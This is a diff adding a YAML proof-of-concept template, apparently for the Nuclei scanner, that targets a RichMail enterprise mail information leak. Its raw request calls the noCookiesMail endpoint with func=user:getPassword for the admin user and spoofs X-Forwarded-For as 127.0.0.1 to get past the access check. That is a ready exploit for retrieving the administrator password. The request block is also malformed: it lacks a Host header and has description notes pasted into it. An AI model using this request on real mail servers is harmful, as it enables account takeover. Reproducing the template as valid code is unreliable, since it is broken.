@@ -1,0 +1,37 @@
+id: poc-mq9doro9umwfg83y
+info:
+  name: RichMail 企业邮箱敏感信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mq9doro9umwfg83y'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mq9doro9umwfg83y
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin HTTP/1.1
+
+
+    X-Forwarded-For: 127.0.0.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    S_OK
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
